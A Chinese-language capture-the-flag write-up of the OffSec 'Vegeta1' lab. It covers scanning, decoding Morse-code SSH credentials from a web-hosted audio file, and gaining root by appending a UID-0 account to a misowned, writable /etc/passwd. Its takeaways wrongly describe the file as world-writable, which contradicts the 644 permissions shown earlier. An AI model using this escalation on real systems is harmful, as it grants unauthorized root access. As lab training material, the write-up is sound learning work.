# Vegeta1 靶機滲透測試紀錄

> [!info] **靶機基本資訊**
> - **平台**：OffSec Proving Grounds (Play)
> - **作業系統**：linux
> - **難易度**：easy
> - **開始時間**：2026-07-02

---

## 🔍 1. 偵察與列舉 (Reconnaissance & Enumeration)

### 🚀 快速連接埠掃描 (Nmap)
使用 Nmap 掃描目標主機，定位開放的連接埠：
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ rustscan -a 192.168.192.73 -- -sV

..........

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.38 ((Debian))
```

**掃描結果整理：**

| 連接埠 (Port) | 服務 (Service) | 版本 (Version)         | 備註 / 潛在漏洞點           |
| ---------- | ------------ | -------------------- | -------------------- |
| 22/tcp     | SSH          | OpenSSH 7.9p1 Debian | 遠端管理服務，可用於取得憑證後互動登入。 |
| 80/tcp     | HTTP         | Apache httpd 2.4.38  | Web 網頁服務，本題主要入口。     |

---

### 🌐 網頁服務列舉 (Web Enumeration)
訪問 Port 80 的 HTTP 網頁，預設頁面展示動漫主題資訊。隨後對網頁服務進行目錄爆破。

![](image/Pasted%20image%2020260702220508.png)

#### 📁 目錄爆破 (Feroxbuster / Gobuster)
```bash
sudo apt update
sudo apt install seclists
```
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ gobuster dir -u http://192.168.192.73/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -x php,txt,html -t 50
```
**發現的敏感路徑：**
- `http://192.168.x.x/bulma/` - *存取發現 Bulma 的動漫角色圖片，並在此目錄下尋獲一個敏感音訊檔案 `hahahaha.wav`*
	![](image/Pasted%20image%2020260702222610.png)

---

## ⚡ 2. 漏洞分析與初始存取 (Vulnerability Analysis & Initial Access)

### 🕵️ 漏洞分析 (Vulnerability Assessment)
訪問 `http://192.168.x.x/bulma/hahahaha.wav` 可以聽到一段連續的嗶聲。推測此音訊檔案採用了 **摩斯密碼 (Morse Code)** 進行隱寫，裡面可能隱藏了使用者的登入憑證。
![](image/Pasted%20image%2020260702222657.png)

---

### 🔑 初始存取突破 (Exploitation)

#### 1. 摩斯密碼音訊解密 (Morse Code Decoding)
將 `hahahaha.wav` 下載至本機：
```bash
┌──(kali㉿kali)-[~/Desktop/playground/Vegeta1]
└─$ wget http://192.168.192.73/bulma/hahahaha.wav
```
將音訊檔案上傳至線上摩斯密碼音訊解密網站（如 [Morse Code World Audio Decoder](https://morsecode.world/international/decoder/audio-decoder-adaptive.html)）或是利用本地工具進行音軌分析與解碼。
解碼後成功獲得明文憑證：
*   解密出的文字內容指明：帳號名稱為 `trunks`，密碼為 `u$3r`。
	![](image/Pasted%20image%2020260702223241.png)

> [!key] **Credentials Found**
> *   **Username**: `trunks`
> *   **Password**: `u$3r`
> *   **來源**：`/bulma/hahahaha.wav` 摩斯密碼音訊解密

#### 2. SSH 登入初始 Access
使用獲取的憑證，透過 SSH 連接至靶機：
```bash
┌──(kali㉿kali)-[~/Desktop/playground/Vegeta1]
└─$ ssh trunks@192.168.192.73
The authenticity of host '192.168.192.73 (192.168.192.73)' can't be established.
ED25519 key fingerprint is: SHA256:rsXPQiqA/9/evxX6rCmmUEw19kPNCvB8JB0r8rYuXR4
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.192.73' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
trunks@192.168.192.73's password: 
Linux Vegeta 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
trunks@Vegeta:~$ find / -type f -name local.txt 2>/dev/null
/home/trunks/local.txt
```
登入成功後，即可在 `trunks` 的家目錄下讀取 `local.txt` 取得第一個 Flag。

---

## 📈 3. 特權提升 (Privilege Escalation)

### 🕵️ 本地資訊收集 (Local Enumeration)
在 `trunks` 使用者權限下進行本機權限枚舉。當我們檢查系統中敏感檔案的寫入權限時，發現核心帳號設定檔 `/etc/passwd` 竟然對 `trunks` 使用者可寫：
```bash
trunks@Vegeta:~$ find /etc -writable -type f 2>/dev/null
/etc/passwd
trunks@Vegeta:~$ ls -al /etc/passwd
-rw-r--r-- 1 trunks root 1486 Jun 28  2020 /etc/passwd
```

**關鍵安全觀察**：
雖然 `/etc/passwd` 的權限為看似正常的 `-rw-r--r--`（`644` 權限），但該檔案的**擁有者 (Owner) 被錯誤指派給了普通使用者 `trunks`**，而不是預設的 `root`。因此，`trunks` 作為該檔案的 Owner，對其擁有完整的寫入權限，這在 Linux 安全配置上是極為致命的錯誤。

---

### 👑 提權利用 (Exploitation to Root)

#### 1. 生成密碼 Hash 碼
我們需要在 `/etc/passwd` 中新增一個具備 root 權限 (UID: 0, GID: 0) 的自定義使用者。首先在本地或攻擊機使用 `openssl` 生成一個加密的密碼 Hash（此處以密碼設為 `123456`，使用 MD5-crypt 算法為例）：
```bash
┌──(kali㉿kali)-[~/Desktop/playground/Vegeta1]
└─$ openssl passwd -1 -salt myroot 123456
$1$myroot$HkfyirKfgarMiAtDi6Lat/
```
**生成的 Hash 輸出**：
```text
$1$myroot$HkfyirKfgarMiAtDi6Lat/
```

#### 2. 追加自定義特權使用者至 `/etc/passwd`
使用 `echo` 指令將我們自定義的使用者 `newroot` 追加寫入 `/etc/passwd` 檔案的最尾端：
```bash
trunks@Vegeta:~$ echo 'newroot:$1$myroot$HkfyirKfgarMiAtDi6Lat/:0:0:root:/root:/bin/bash' >> /etc/passwd

trunks@Vegeta:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
trunks:x:1000:1000:trunks,,,:/home/trunks:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
newroot:$1$myroot$HkfyirKfgarMiAtDi6Lat/:0:0:root:/root:/bin/bash
```

#### 3. 切換帳號取得 Root 權限
在終端機中執行 `su` 切換為我們新增的特權使用者：
```bash
trunks@Vegeta:~$ su newroot
Password: 
root@Vegeta:/home/trunks#
```
切換成功後，執行 `whoami` 確認已順利取得 `root` 權限，並可在 `/root/proof.txt` 讀取 Root Flag。
```bash
root@Vegeta:/home/trunks# whoami
root
root@Vegeta:/home/trunks# find / -type f -name proof.txt 2>/dev/null
/root/proof.txt
```

---

## 💡 4. 心得與學習點 (Key Takeaways)

1. **為什麼這個漏洞會存在？**
   - **敏感憑證外洩**：不應將 SSH 帳密以明文或簡易編碼（摩斯密碼）形式作為音訊檔案放在 Web 可公開存取的目錄下。
   - **致命的權限設定錯誤 (World-Writable /etc/passwd)**：系統管理員在配置時不小心將 `/etc/passwd` 的寫入權限開放給了所有使用者（`666` 或 `777` 權限），使得原本唯讀的系統認證檔被惡意篡改，導致本地提權。

2. **安全防禦建議：**
   - 移除 Web 目錄下所有非必要的敏感檔案。
   - 確保系統密碼檔 `/etc/passwd` 的權限設定為絕對安全的 `-rw-r--r--` (`644` 權限)，限制只有 `root` 帳號才具備寫入權限。
